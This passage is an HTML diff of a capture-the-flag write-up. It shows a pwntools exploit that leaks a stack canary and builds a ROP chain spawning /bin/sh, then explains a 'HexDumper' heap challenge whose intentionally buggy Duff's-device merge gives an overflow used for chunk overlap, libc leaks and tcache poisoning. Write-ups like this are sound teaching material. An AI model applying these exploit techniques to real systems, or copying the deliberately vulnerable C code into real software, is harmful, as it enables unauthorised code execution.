+        <span class="k">if</span> <span class="sa">b</span><span class="s">":&lt;"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">recieved</span><span class="p">:</span>
+            <span class="k">break</span>
+        
+        <span class="n">heap_base</span> <span class="o">-=</span> <span class="mh">0x20</span> <span class="c1"># malloc chunk size
+</span>        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"binary was found at offset </span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="c1"># Binary search for the base of the binary.
+</span>    <span class="n">l</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">-</span> <span class="n">heap_base</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">l</span> <span class="o">+</span> <span class="n">bin_size</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"searching for binary base"</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">l</span> <span class="o">&lt;=</span> <span class="n">r</span><span class="p">:</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="o">+</span><span class="n">r</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="sa">f</span><span class="s">"trying </span><span class="si">{</span><span class="n">l</span><span class="o">=</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">r</span><span class="o">=</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">m</span><span class="o">=</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">m</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+        <span class="n">recieved</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"poni"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s">":&lt;"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">recieved</span><span class="p">:</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">m</span><span class="o">+</span><span class="mi">1</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">m</span><span class="o">-</span><span class="mi">1</span>
+        <span class="n">l</span> <span class="o">-=</span> <span class="mh">0x20</span>
+        <span class="n">r</span> <span class="o">-=</span> <span class="mh">0x20</span>
+    <span class="n">bin_base_offset</span> <span class="o">=</span> <span class="n">m</span> <span class="o">-</span> <span class="n">bin_size</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"binary base found at </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_base_offset</span><span class="p">)</span><span class="o">=</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="c1"># Overwrite the mov instructions.
+</span>    <span class="n">bin_base_offset</span> <span class="o">-=</span> <span class="mh">0x20</span>
+    <span class="n">read_movl_offset</span> <span class="o">=</span> <span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span><span class="o">+</span><span class="mi">3670</span><span class="o">+</span><span class="mi">3</span> <span class="o">-</span> <span class="n">exe</span><span class="p">.</span><span class="n">address</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">bin_base_offset</span><span class="o">+</span><span class="n">read_movl_offset</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="n">bin_base_offset</span> <span class="o">-=</span> <span class="mh">0x20</span>
+    <span class="n">write_movq_offset</span> <span class="o">=</span> <span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span><span class="o">+</span><span class="mi">3627</span><span class="o">+</span><span class="mi">4</span> <span class="o">-</span> <span class="n">exe</span><span class="p">.</span><span class="n">address</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">bin_base_offset</span><span class="o">+</span><span class="n">write_movq_offset</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"poni"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">21</span><span class="p">)</span>
+    <span class="n">stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+    <span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"canary: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">rbp</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span>
+    <span class="c1"># 0x0000000044c07e: pop rsi; ret;
+</span>    <span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x0000000044c07e</span>
+    <span class="c1"># 0x0000000042c05c: pop rax; ret;
+</span>    <span class="n">pop_rax</span> <span class="o">=</span> <span class="mh">0x0000000042c05c</span>
+    <span class="c1"># 0x0000000040478d: pop rdi; pop rbp; ret;
+</span>    <span class="n">pop_rdi_rbp</span> <span class="o">=</span> <span class="mh">0x0000000040478d</span>
+    <span class="c1"># 0x000000004025cc: syscall;
+</span>    <span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x000000004025cc</span>
+    
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xfa</span><span class="s">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="n">rbp</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_rbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6162</span><span class="p">)</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">info</span><span class="p">(</span><span class="s">"payload sent"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"poni"</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="mh">0xc0ffee</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="hexdumper">HexDumper</h2>
+
+<h3 id="unintended">Unintended</h3>
+<p>There was an unintended in the <code class="language-plaintext highlighter-rouge">ask_for_index()</code> function for negative indexes :(. Skill issue on my part.
+You can ask other teams for their solve.</p>
+
+<h3 id="intended">Intended</h3>
+<p>TLDR: Merge with a dump of size zero to get an 8-byte overflow -&gt; get overlapping chunks -&gt; tcache poison -&gt; arbitrary code execution on latest libc (e.g., via FSOP)</p>
+
+<p>Our goal is to get an out-of-bounds write on the heap.
+By examining the code, we can notice a potential issue in the Duff’s Device when <code class="language-plaintext highlighter-rouge">count</code> equals zero. Indeed in the wikipedia post it’s written that <code class="language-plaintext highlighter-rouge">This code assumes that initial count &gt; 0</code>.
+To get count to equal to zero we must set the length of the second chunk to zero.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">merge_dumps</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">idx1</span> <span class="o">=</span> <span class="n">ask_for_index</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">idx1</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">dumps</span><span class="p">[</span><span class="n">idx1</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">Dump with index %d doesn't exist</span><span class="se">\t</span><span class="s">"</span><span class="p">,</span> <span class="n">idx1</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="kt">int</span> <span class="n">idx2</span> <span class="o">=</span> <span class="n">ask_for_index</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">idx2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">dumps</span><span class="p">[</span><span class="n">idx2</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">Dump with index %d doesn't exist</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">idx2</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">idx1</span> <span class="o">==</span> <span class="n">idx2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">Can't merge a dump with itself"</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kt">size_t</span> <span class="n">len1</span> <span class="o">=</span> <span class="n">dump_sizes</span><span class="p">[</span><span class="n">idx1</span><span class="p">];</span>
+    <span class="kt">size_t</span> <span class="n">len2</span> <span class="o">=</span> <span class="n">dump_sizes</span><span class="p">[</span><span class="n">idx2</span><span class="p">];</span>
+    <span class="kt">size_t</span> <span class="n">new_len</span> <span class="o">=</span> <span class="n">len1</span> <span class="o">+</span> <span class="n">len2</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">new_len</span> <span class="o">&gt;</span> <span class="n">MAX_DUMP_SIZE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">Merged size is too big! %lu &gt; %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+               <span class="n">new_len</span><span class="p">,</span>
+               <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">MAX_DUMP_SIZE</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">dumps</span><span class="p">[</span><span class="n">idx1</span><span class="p">]</span> <span class="o">=</span> <span class="n">realloc</span><span class="p">(</span><span class="n">dumps</span><span class="p">[</span><span class="n">idx1</span><span class="p">],</span> <span class="n">len1</span><span class="o">+</span><span class="n">len2</span><span class="p">);</span>
+    <span class="n">dump_sizes</span><span class="p">[</span><span class="n">idx1</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_len</span><span class="p">;</span>
+
+    <span class="c1">// Code from: https://en.wikipedia.org/wiki/Duff%27s_device</span>
+    <span class="k">register</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">to</span> <span class="o">=</span> <span class="n">dumps</span><span class="p">[</span><span class="n">idx1</span><span class="p">]</span><span class="o">+</span><span class="n">len1</span><span class="p">,</span> <span class="o">*</span><span class="n">from</span> <span class="o">=</span> <span class="n">dumps</span><span class="p">[</span><span class="n">idx2</span><span class="p">];</span>
+    <span class="k">register</span> <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">len2</span><span class="p">;</span>
+    <span class="p">{</span>
+        <span class="k">register</span> <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="p">(</span><span class="n">count</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
+        <span class="k">switch</span> <span class="p">(</span><span class="n">count</span> <span class="o">%</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="mi">0</span><span class="p">:</span> <span class="k">do</span> <span class="p">{</span> <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">7</span><span class="p">:</span>      <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">6</span><span class="p">:</span>      <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">5</span><span class="p">:</span>      <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">4</span><span class="p">:</span>      <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>      <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>      <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>      <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
+                <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="n">n</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="n">dumps</span><span class="p">[</span><span class="n">idx2</span><span class="p">]);</span>
+    <span class="n">dumps</span><span class="p">[</span><span class="n">idx2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">dump_sizes</span><span class="p">[</span><span class="n">idx2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="o">--</span><span class="n">no_dumps</span><span class="p">;</span>
+    
+    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">Merge successful"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>In this case, we get an 8-byte overflow that copies the first 8 bytes
+from the second chunk to the end of the merged one. Since the size of the allocation remains unchanged, <code class="language-plaintext highlighter-rouge">realloc()</code> doesn’t move it - no reallocation occurs
+and the function returns the same address. In effect, we get a primitive that
+writes 8 arbitrary bytes after the first merged chunk. This can be used to corrupt heap metadata.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># Allocate 3 dumps.
+</span>    <span class="n">a</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">24</span><span class="p">)</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+
+    <span class="c1"># We write p64(0x411) at the first 8 bytes of dump a.
+</span>    <span class="c1"># Those are the bytes that will be appended in the overflow
+</span>    <span class="c1"># to dump b during the merge.
+</span>    <span class="n">change_bytes</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x411</span><span class="p">))</span>
+    <span class="c1"># Resize dump a to zero to exploit the bug in Duff's device.
+</span>    <span class="n">resize_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="c1"># Do the merge, in effect we overwrite the heap's metadata.
+</span>    <span class="c1"># Specifically we overwrite dump c's chunk size to 0x410.
+</span>    <span class="n">merge</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>In the code responsible for resizing we can see that there’s an explicit if statement
+that avoids doing a realloc when the size is smaller. As the challenge’s author
+I did this intentionally, <a href="https://stackoverflow.com/questions/28659940/does-reallocp-0-really-involves-freep-in-glibc">as otherwise the behaviour of <code class="language-plaintext highlighter-rouge">realloc(p, 0)</code></a>
+is very annoying in the context of this challenge.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">resize_dump</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="n">ask_for_index</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">idx</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">dumps</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">Dump with index %d doesn't exist</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">New size: "</span><span class="p">);</span>
+    <span class="kt">size_t</span> <span class="n">new_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">new_size</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">&gt;</span> <span class="n">MAX_DUMP_SIZE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">New size is too big! %lu &gt; %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+               <span class="n">new_size</span><span class="p">,</span>
+               <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">MAX_DUMP_SIZE</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="kt">size_t</span> <span class="n">old_size</span> <span class="o">=</span> <span class="n">dump_sizes</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">old_size</span> <span class="o">&lt;</span> <span class="n">new_size</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">dumps</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">realloc</span><span class="p">(</span><span class="n">dumps</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span> <span class="n">new_size</span><span class="p">);</span>
+
+        <span class="c1">// Zero out the new memory</span>
+        <span class="kt">size_t</span> <span class="n">no_new_bytes</span> <span class="o">=</span> <span class="n">new_size</span> <span class="o">-</span> <span class="n">old_size</span><span class="p">;</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">dumps</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">+</span><span class="n">old_size</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">no_new_bytes</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="n">dump_sizes</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_size</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">Resize successful"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This is how the heap looks like before the merge, where each color represents a different allocated chunk:
+<img src="https://github.com/user-attachments/assets/51993355-78e9-411e-9ec0-5610ce9425c4" alt="image" /></p>
+
+<p>And this is how the heap looks like after the merge. We free the chunk representing dump a and we overwrite
+dump c’s chunk size to 0x411.</p>
+
+<p><img src="https://github.com/user-attachments/assets/d7cfcefa-302c-4202-a0b2-04491f0faac6" alt="image" /></p>
+
+<p>If you’re confused for example why all the chunks have the same size 0x20 (or what is tcache later in the write-up), I recommend diving into glibc’s malloc
+internals. <a href="https://sourceware.org/glibc/wiki/MallocInternals">This link is a good start</a>.
+In short, the size gets aligned to a multiple of 16 and there’s also a trick where the prev_size value of the next chunk
+is used as a part of the allocated memory, so no need to include it in the size.</p>
+
+<p>After overwriting the size, we can easily get overlapping chunks resulting in an easy way to leak addresses and
+do tcache poisoning.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># Free the chunk and allocate it again to get overlapping chunks.
+</span>    <span class="n">remove_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+    <span class="c1"># Fix the top chunk size that got zeroed-out by the allocation.
+</span>    <span class="n">change_bytes</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="mi">16</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000020d11</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Since we already have overlapping chunks lets start with getting the leaks. To get them we will malloc a huge chunk
+that after a free will land in the unsorted bin, as they contain libc addresses we want to leak.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">leaky_dump</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>
+    <span class="c1"># Create a chunk so after freeing the one above it wont get merged
+</span>    <span class="c1"># with the top chunk.
+</span>    <span class="n">guard_dump</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
+    <span class="n">remove_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">leaky_dump</span><span class="p">)</span>
+    <span class="n">hx</span> <span class="o">=</span> <span class="n">hexdump_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
+    <span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">hx</span><span class="p">[</span><span class="mi">32</span><span class="p">:</span><span class="mi">32</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">)</span><span class="o">=</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x211b20</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="o">=</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>After that we leak some more stuff to <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/decrypt_safe_linking.c">decrypt safe linking</a>
+and prepare tcache linked list for corruption. The size 0xe8 is not arbitrary, as I will aim for <a href="https://niftic.ca/posts/fsop/">FSOP</a> later to get
+arbitrary code execution and this is the size of the FILE struct I want to overwrite.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># Create small chunks for tcache poisoning.
+</span>    <span class="n">d</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">g</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+    
+    <span class="n">remove_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">g</span><span class="p">)</span>
+    <span class="n">hx</span> <span class="o">=</span> <span class="n">hexdump_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
+    <span class="c1"># Leak xor key to decrypt safe linking.
+</span>    <span class="n">xor_key</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">hx</span><span class="p">[</span><span class="mh">0x2f0</span><span class="p">:</span><span class="mh">0x2f0</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">xor_key</span><span class="p">)</span><span class="o">=</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="c1"># Prepare chunks for tcache poisoning.
+</span>    <span class="n">remove_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+    <span class="n">remove_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+    <span class="n">remove_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">d</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Finally, we do the poisoning to get an almost arbitrary write on libc.
+To get code execution with it <a href="https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc">this is a good resource</a>
+, though it is somewhat outdated. From experience I can say that the libc’s GOT table
+is now <a href="https://ctf101.org/binary-exploitation/relocation-read-only/">FULL RELRO</a> and dtor_list is no longer
+close to PTR_MANGLE cookie. Though FSOP still works like a charm and nothing suggests that anything will change.
+I use a payload I’ve seen only ptr-yudai use in their’s write-ups, but it’s the best one I’ve seen.</p>
